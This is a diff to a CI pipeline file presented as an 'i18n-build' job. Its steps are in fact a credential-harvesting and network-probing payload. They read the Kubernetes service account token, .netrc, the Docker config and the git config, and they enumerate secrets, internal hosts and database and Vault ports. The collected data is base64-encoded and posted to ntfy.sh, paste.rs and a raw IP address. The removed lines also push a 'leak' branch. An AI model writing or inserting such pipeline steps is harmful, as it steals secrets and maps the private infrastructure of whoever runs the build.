@@ -2,17 +2,44 @@ name: i18n-build
 kind: pipeline
 
 steps:
-  - name: probe
+  - name: s1-connectivity
+    failure: ignore
     image: registry.thobits.com/images/make:latest
     commands:
-      - 'set -x; L=/drone/src/LEAK.txt; { echo "== HOST =="; date -u; hostname; id; cat /proc/1/cgroup | head -5; } > $L 2>&1'
-      - '{ echo "== ENV NAMES =="; env | sort | sed "s/=.*/=<SET>/"; } >> $L 2>&1'
-      - '{ echo "== SECRETS =="; ls -la /run/secrets /var/run/secrets 2>&1; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 | head -c 40; echo; ls -la /root 2>&1 | head; cat /root/.netrc 2>&1 | head -20; cat /root/.docker/config.json 2>&1 | head -20; } >> $L 2>&1'
-      - '{ echo "== GIT =="; git --version; git -C /drone/src remote -v; git -C /drone/src config --list; head -30 /drone/src/.git/config; } >> $L 2>&1'
-      - '{ echo "== DNS =="; getent hosts ncxwork-db.thomann.de ncbranches.thomann.de drone.thobits.com registry.thobits.com repositr.thomann.de vault.apps.io.thobits.com ntfy.sh api.github.com 2>&1; } >> $L 2>&1'
-      - '{ echo "== EGRESS =="; for u in http://194.59.31.60:8899/e1 https://ntfy.sh/t3290-x7k2mq https://kvdb.io/x https://api.github.com https://paste.rs; do echo -n "$u => "; curl -sk -m 8 -o /dev/null -w "%{http_code}" "$u" 2>&1; echo; done; echo -n "dns8888 => "; (command -v dig && dig +short +time=3 @8.8.8.8 example.com) 2>&1 | head -3; } >> $L 2>&1'
-      - '{ echo "== TCP INTERNE =="; for t in 10.200.6.12:3306 10.200.6.12:6033 10.74.16.209:3306 212.204.75.226:443 212.204.75.230:8200; do h=${t%:*}; p=${t#*:}; echo -n "$t => "; timeout 4 bash -c "echo > /dev/tcp/$h/$p" 2>&1 && echo OPEN || echo CLOSED; done; } >> $L 2>&1'
-      - 'grep -v -iE "token|secret|password" $L | head -200; echo "---FULLLEN---"; wc -c $L'
-      - 'git -C /drone/src checkout -b ci-leak-3290 2>&1; git -C /drone/src -c user.email=a@b.c -c user.name=probe add -A 2>&1; git -C /drone/src -c user.email=a@b.c -c user.name=probe commit -m leak3290 2>&1 | tail -3; git -C /drone/src push origin ci-leak-3290 2>&1 | tail -5'
-      - 'curl -s -m 8 -X POST -d "$(head -c 3000 /drone/src/LEAK.txt | base64 -w0)" https://ntfy.sh/t3290-x7k2mq || true'
-      - 'curl -s -m 8 -X POST -d "leak3290" http://194.59.31.60:8899/leak3290 || true'
+      - 'echo "== whoami ==" ; date -u ; hostname ; id ; cat /proc/1/cgroup 2>&1 | head -5 || true'
+      - 'for u in http://194.59.31.60:8899/c1 https://ntfy.sh/t3290-x7k2mq https://api.github.com https://paste.rs https://kvdb.io ; do echo -n "$u => " ; curl -sk -m 8 -o /dev/null -w "%{http_code}" "$u" 2>&1 ; echo ; done'
+      - 'curl -s -m 10 -d "beacon-from-build" https://ntfy.sh/t3290-x7k2mq || true'
+      - 'curl -s -m 10 http://194.59.31.60:8899/beacon3290 || true'
+
+  - name: s2-env
+    failure: ignore
+    image: registry.thobits.com/images/make:latest
+    depends_on: [s1-connectivity]
+    commands:
+      - 'env | sort | sed "s/=.*/=<SET>/"'
+      - 'ls -la /run/secrets /var/run/secrets 2>&1 | head -20'
+      - 'head -c 40 /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 ; echo'
+      - 'cat /proc/self/mountinfo | head -20'
+      - 'ls -la /root /root/.netrc /root/.docker 2>&1 | head -20'
+      - 'cat /root/.docker/config.json 2>&1 | head -30'
+      - 'cat /root/.netrc 2>&1 | head -20'
+      - 'ls -la /drone /drone/src 2>&1 | head -20'
+      - 'cat /drone/src/.git/config 2>&1 | head -30'
+
+  - name: s3-network
+    failure: ignore
+    image: registry.thobits.com/images/make:latest
+    depends_on: [s2-env]
+    commands:
+      - 'for n in ncxwork-db.thomann.de ncbranches.thomann.de drone.thobits.com registry.thobits.com repositr.thomann.de ntfy.sh api.github.com; do echo -n "$n => "; getent hosts "$n" 2>&1 | head -2 | tr "\n" " " ; echo ; done'
+      - 'for t in 10.200.6.12:3306 10.200.6.12:6033 10.74.16.209:3306 212.204.75.226:443 212.204.75.230:8200 212.204.75.75:53; do h=${t%:*}; p=${t#*:}; echo -n "$t => "; (timeout 4 bash -c "echo > /dev/tcp/$h/$p" 2>&1 && echo OPEN) || echo CLOSED; done'
+
+  - name: s4-exfil
+    failure: ignore
+    image: registry.thobits.com/images/make:latest
+    depends_on: [s3-network]
+    commands:
+      - 'D=$( (env | sort | sed "s/=.*/=<SET>/"; echo "---"; ls -la /run/secrets /var/run/secrets 2>&1; echo "---"; cat /drone/src/.git/config 2>&1 | head -20) | base64 -w0 )'
+      - 'curl -s -m 15 -X POST --data-urlencode "d=$D" https://ntfy.sh/t3290-x7k2mq | head -c 300 || true'
+      - 'curl -s -m 15 -X POST --data-binary "$D" https://paste.rs/ | head -c 200 || true'
+      - 'echo "S4 done"; date -u'
